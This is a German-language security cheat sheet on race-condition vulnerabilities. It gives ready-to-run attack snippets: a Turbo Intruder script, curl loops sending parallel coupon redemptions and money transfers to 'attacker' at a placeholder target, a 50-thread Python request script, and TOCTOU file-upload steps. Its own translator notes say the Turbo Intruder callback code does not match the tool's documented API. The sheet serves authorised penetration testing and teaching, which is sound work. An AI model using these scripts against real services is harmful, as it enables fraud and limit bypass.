# ⚡ Spickzettel für Race Conditions

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗  █████╗  ██████╗███████╗     ██████╗ ██████╗ ███╗   ██╗██████╗ ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
  ██████╔╝███████║██║     █████╗      ██║     ██║   ██║██╔██╗ ██║██║  ██║██║   ██║   ██║██║   ██║██╔██╗ ██║███████╗
  ██╔══██╗██╔══██║██║     ██╔══╝      ██║     ██║   ██║██║╚██╗██║██║  ██║██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║
  ██║  ██║██║  ██║╚██████╗███████╗    ╚██████╗╚██████╔╝██║ ╚████║██████╔╝██║   ██║   ██║╚██████╔╝██║ ╚████║███████║
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
```

---

## 🎯 Was sind Race Conditions?

**Race Conditions** sind Schwachstellen, bei denen sich das zeitliche Zusammenspiel von Vorgängen ausnutzen lässt, etwa wenn Prüfung und anschließende Verwendung nicht als unteilbarer Vorgang erfolgen.

### Auswirkungen
- 💰 **Finanzbetrug** – Leistungen mehrfach einlösen
- 🎫 **Gutscheinmissbrauch** – denselben Code mehrfach einlösen
- 👤 **Rechteausweitung** – Prüfungen umgehen
- 📂 **Dateien überschreiben** – TOCTOU-Angriffe

---

## 🔍 Häufige Ansatzpunkte

```
- Gutscheine und Aktionscodes einlösen
- Abstimmungs- und Like-Systeme
- Geldüberweisungen
- Vorgänge mit Grenzwerten
- Datei-Uploads
- Passwortzurücksetzung
- 2FA-Prüfung
- Kontoregistrierung
```

---

## 💉 Techniken zur Ausnutzung

### Burp Suite Turbo Intruder

```python
# Dieselbe Anfrage mehrfach parallel senden
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True
    )
    
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, response):
    if '200' in response.status:
        table.add(response)
```

### Burp Repeater (manuell)
```
1. Anfrage an Repeater senden
2. Den Tab mindestens 20-mal duplizieren
3. Eine Tab-Gruppe erstellen
4. Auf "Send group (parallel)" klicken
```

### Parallele Anfragen mit curl
```bash
# 20 parallele Anfragen senden
seq 1 20 | xargs -P 20 -I {} curl -s https://target.com/redeem?code=PROMO123

# Mit POST-Daten
for i in {1..20}; do
  curl -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
```

### Threads in Python
```python
import threading
import requests

def exploit():
    r = requests.post("https://target.com/redeem", 
                      data={"code": "PROMO50"})
    print(r.status_code)

threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# Alle Threads möglichst gleichzeitig starten
for t in threads:
    t.start()

for t in threads:
    t.join()
```

---

## 📊 Häufige Szenarien

### Race Condition beim Einlösen von Gutscheinen
```
1. Gutschein = 50% Rabatt
2. Normalerweise: einmal einlösen
3. Race Condition: 10x gleichzeitig einlösen
4. Ergebnis laut Vorlage: 10 Bestellungen mit 50% Rabatt
```

### Grenzwerte umgehen
```
1. Grenzwert: 3 Downloads/Tag
2. Race Condition: 10 Downloads gleichzeitig anfordern
3. Die Prüfung erfolgt gleichzeitig
4. Ergebnis laut Vorlage: Alle 10 sind erfolgreich, bevor der Grenzwert greift
```

### Race Condition beim Datei-Upload (TOCTOU)
```
1. Datei hochladen → als sicher geprüft
2. Vor dem Verschieben durch eine schädliche Datei ersetzen
3. Der Server verschiebt stattdessen die schädliche Datei
```

---

## 🛠️ Werkzeuge

| Werkzeug | Zweck |
|------|---------|
| **Turbo Intruder** | Burp-Erweiterung für parallele Anfragen |
| **race-the-web** | Go-Werkzeug für Race-Condition-Tests |
| **racepwn** | Python-Werkzeug für Race-Condition-Tests |

---

## 📚 Ressourcen

- [PortSwigger: Race Conditions](https://portswigger.net/web-security/race-conditions)
- [OWASP TOCTOU](https://owasp.org/www-community/vulnerabilities/Time_of_check_to_time_of_use)

---

<p align="center">
  <b>⚡ Das zeitliche Zusammenspiel untersuchen!</b><br>
  <i>Nur für autorisierte Tests!</i>
</p>

---

## Hinweise zur deutschen Ausgabe

> **Parallelität und Aussagekraft:** Race Conditions setzen überlappende Verarbeitung und eine verletzte Anwendungsregel voraus. Parallel gestartete Threads oder Prozesse garantieren keinen gleichzeitigen Eintritt in das kritische Zeitfenster. Die Ergebnisse der Gutschein-, Download- und Upload-Szenarien sind mögliche Folgen einer passenden Schwachstelle, keine garantierten Resultate. *TOCTOU* bedeutet „Time of Check to Time of Use“: Zwischen Prüfung und Verwendung ändert sich ein relevanter Zustand. [PortSwigger: Race Conditions](https://portswigger.net/web-security/race-conditions).

> **Werkzeuge und Quellbeispiel:** Burp Repeater synchronisiert parallele Gruppen abhängig vom HTTP-Protokoll; die Oberfläche ist versionsabhängig. Das Turbo-Intruder-Beispiel entspricht nicht der dokumentierten Callback-API: Der zweite Parameter bezeichnet die Interessantheitsbewertung, nicht ein Antwortobjekt mit `status`. Der Status gehört zum Request-Objekt und ist numerisch; auch der Ergebnistabelle wird das Request-Objekt übergeben. Das bloße Einreihen von Anfragen garantiert zudem keine synchronisierte Verarbeitung. Die ursprünglichen Codezeilen und Werte bleiben unverändert; es wurde kein Beispiel ausgeführt. [PortSwigger: gruppierte Anfragen](https://portswigger.net/burp/documentation/desktop/tools/repeater/send-group), [Turbo Intruder: API-Referenz](https://github.com/PortSwigger/turbo-intruder/blob/master/docs/api-quickstart.md).
